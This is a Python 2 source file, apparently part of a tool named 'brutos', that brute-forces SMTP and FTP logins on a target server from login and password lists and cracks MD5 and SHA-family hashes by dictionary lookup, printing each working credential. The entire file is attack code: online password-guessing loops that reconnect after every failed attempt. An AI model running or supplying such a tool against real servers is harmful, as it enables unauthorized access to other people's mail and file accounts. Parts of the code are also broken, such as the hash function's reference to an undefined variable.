# coding: utf8

import smtplib, ftplib, telnetlib, hashlib
from sys import path
import os, time
from colorama import Fore
import json

path.insert (0, os.path.dirname(os.path.realpath(__file__)) + '/brutos_files/modules/')

import output

# Config Variables #

TIME_SLEEP = 0
SHOW_GOODS = 1

# ---------------- #

types = [
    'smtp', 'ftp', 'hash'
]

def parse_json_config (config_path):
    
    global TIME_SLEEP, SHOW_GOODS
    
    JSON_CODE = ''
    
    try:
        for i in open (config_path, 'r').readlines ():
            JSON_CODE += i
    except IOError:
        print output.ERR + 'Can\'t open config-file!'
    
    parser = json.loads (JSON_CODE)
    
    TIME_SLEEP = parser ['timeSleep']
    SHOW_GOODS = parser ['showGoods']

def brute_smtp (login, pass_list, server, port):
    
    IS_ARRAY = False
    GOOD = []
    
    if port != None:
        s = smtplib.SMTP (server, port)
    else:
        s = smtplib.SMTP (server)
    
    s.starttls ()
    
    try:
        login.append ('!')
        login.remove ('!')
        IS_ARRAY = True
    except:
        IS_ARRAY = False
    
    try:    
        f = pass_list
    except:
        print output.ERR + 'Can\'t open file with passwords!'
        exit ()
        
    for i in f.readlines ():
        pwd_full = i.strip ('\n')
        if IS_ARRAY:
            for j in login:
                lg_full = j.strip ('\n')
                try:
                    s.login (lg_full, pwd_full)
                    st_good = 'Login: ' + lg_full + ' Password: ' + pwd_full
                    GOOD.append (st_good)
                    print output.YES + st_good
                    s.quit ()
                except:
                    print output.NO + 'Password ' + pwd_full + ' is not for ' + lg_full
                    if port != None:
                        s = smtplib.SMTP (server, port)
                    else:
                        s = smtplib.SMTP (server)
        else:
            try:
                s.login (login, pwd_full)
                print output.YES + 'Login: ' + login + ' Password: ' + pwd_full
                break
            except:
                print output.NO + 'Password ' + pwd_full + ' is not for ' + login
                if port != None:
                    s = smtplib.SMTP (server, port)
                else:
                    s = smtplib.SMTP (server)
    
    if SHOW_GOODS == 1: show_goods(GOOD)
                        
def brute_ftp (login, pass_list, server, port):
    IS_ARRAY = False
    GOOD = []
    
    if port != None:
        s = ftplib.FTP (server, port)
    else:
        s = ftplib.FTP (server)
    
    try:
        login.append ('!')
        login.remove ('!')
        IS_ARRAY = True
    except:
        IS_ARRAY = False
    
    try:    
        f = pass_list
    except:
        print output.ERR + 'Can\'t open file with passwords!'
        exit ()
        
    for i in f:
        pwd_full = i.strip ('\n')
        if IS_ARRAY:
            for j in login:
                lg_full = j.strip ('\n')
                try:
                    s.login (lg_full, pwd_full)
                    st_good = 'Login: ' + lg_full + ' Password: ' + pwd_full
                    GOOD.append (st_good)
                    print output.YES + st_good
                    s.quit ()
                except:
                    print output.NO + 'Password ' + pwd_full + ' is not for ' + lg_full
                    if port != None:
                        s = ftplib.FTP (server, port)
                    else:
                        s = ftplib.FTP (server)
        else:
            try:
                s.login (login, pwd_full)
                print output.YES + 'Login: ' + login + ' Password: ' + pwd_full
                break
            except:
                print output.NO + 'Password ' + pwd_full + ' is not for ' + login
                if port != None:
                    s = ftplib.FTP (server, port)
                else:
                    s = ftplib.FTP (server)
    if SHOW_GOODS == 1: show_goods(GOOD)

def brute_hash (hash, unhash_list, hash_type):
    IS_ARRAY = False
    GOOD = []
    
    try:
        login.append ('!')
        login.remove ('!')
        IS_ARRAY = True
    except:
        IS_ARRAY = False
    
    try:    
        f = unhash_list
    except:
        print output.ERR + 'Can\'t open file with passwords!'
        exit ()
        
    for i in f:
        pwd_full = i.strip ('\n')
        if IS_ARRAY:
            for j in login:
                    lg_full = j.strip ('\n')
                    if hash_type == 'md5':
                        if lg_full == hashlib.md5(pwd_full).hexdigest ():
                            st_good = 'Hash: ' + lg_full + ' Unhash: ' + pwd_full
                            GOOD.append (st_good)
                            print output.YES + st_good
                        else:
                            print output.NO + 'Unhash ' + pwd_full + ' is not for hash ' + lg_full
                    elif hash_type == 'sha1':
                        if lg_full == hashlib.sha1(pwd_full).hexdigest ():
                            st_good = 'Hash: ' + lg_full + ' Unhash: ' + pwd_full
                            GOOD.append (st_good)
                            print output.YES + st_good
                        else:
                            print output.NO + 'Unhash ' + pwd_full + ' is not for hash ' + lg_full
                    elif hash_type == 'sha224':
                        if lg_full == hashlib.sha224(pwd_full).hexdigest ():
                            st_good = 'Hash: ' + lg_full + ' Unhash: ' + pwd_full
                            GOOD.append (st_good)
                            print output.YES + st_good
                        else:
                            print output.NO + 'Unhash ' + pwd_full + ' is not for hash ' + lg_full
                    elif hash_type == 'sha256':
                        if lg_full == hashlib.sha256(pwd_full).hexdigest ():
                            st_good = 'Hash: ' + lg_full + ' Unhash: ' + pwd_full
                            GOOD.append (st_good)
                            print output.YES + st_good
                        else:
                            print output.NO + 'Unhash ' + pwd_full + ' is not for hash ' + lg_full
                    elif hash_type == 'sha384':
                        if lg_full == hashlib.sha384(pwd_full).hexdigest ():
                            st_good = 'Hash: ' + lg_full + ' Unhash: ' + pwd_full
                            GOOD.append (st_good)
                            print output.YES + st_good
                        else:
                            print output.NO + 'Unhash ' + pwd_full + ' is not for hash ' + lg_full
                    elif hash_type == 'sha512':
                        if lg_full == hashlib.sha512(pwd_full).hexdigest ():
                            st_good = 'Hash: ' + lg_full + ' Unhash: ' + pwd_full
                            GOOD.append (st_good)
                            print output.YES + st_good
                        else:
                            print output.NO + 'Unhash ' + pwd_full + ' is not for hash ' + lg_full
                    if SHOW_GOODS == 1: show_goods(GOOD)
        else:
                    if hash_type == 'md5':
                        if hash == hashlib.md5(pwd_full).hexdigest ():
                            print output.YES + 'Hash: ' + hash + ' Unhash: ' + pwd_full
                            break
                        else:
                            print output.NO + 'Unhash ' + pwd_full + ' is not for hash ' + hash
                    elif hash_type == 'sha1':
                        if hash == hashlib.sha1(pwd_full).hexdigest ():
                            print output.YES + 'Hash: ' + hash + ' Unhash: ' + pwd_full
                            break
                        else:
                            print output.NO + 'Unhash ' + pwd_full + ' is not for hash ' + hash
                    elif hash_type == 'sha224':
                        if hash == hashlib.sha224(pwd_full).hexdigest ():
                            print output.YES + 'Hash: ' + hash + ' Unhash: ' + pwd_full
                            break
                        else:
                            print output.NO + 'Unhash ' + pwd_full + ' is not for hash ' + hash
                    elif hash_type == 'sha256':
                        if hash == hashlib.sha256(pwd_full).hexdigest ():
                            print output.YES + 'Hash: ' + hash + ' Unhash: ' + pwd_full
                            break
                        else:
                            print output.NO + 'Unhash ' + pwd_full + ' is not for hash ' + hash
                    elif hash_type == 'sha384':
                        if hash == hashlib.sha384(pwd_full).hexdigest ():
                            print output.YES + 'Hash: ' + hash + ' Unhash: ' + pwd_full
                            break
                        else:
                            print output.NO + 'Unhash ' + pwd_full + ' is not for hash ' + hash
                    elif hash_type == 'sha512':
                        if hash == hashlib.sha512(pwd_full).hexdigest ():
                            print output.YES + 'Hash: ' + hash + ' Unhash: ' + pwd_full
                            break
                        else:
                            print output.NO + 'Unhash ' + pwd_full + ' is not for hash ' + hash
    if SHOW_GOODS == 1: show_goods(GOOD)

def show_goods (goods):
    if len (goods) > 0:
        print Fore.GREEN + 'GOOD'
        print '#'*70
        for i in goods: print i
        print '#'*70 + Fore.RESET
    
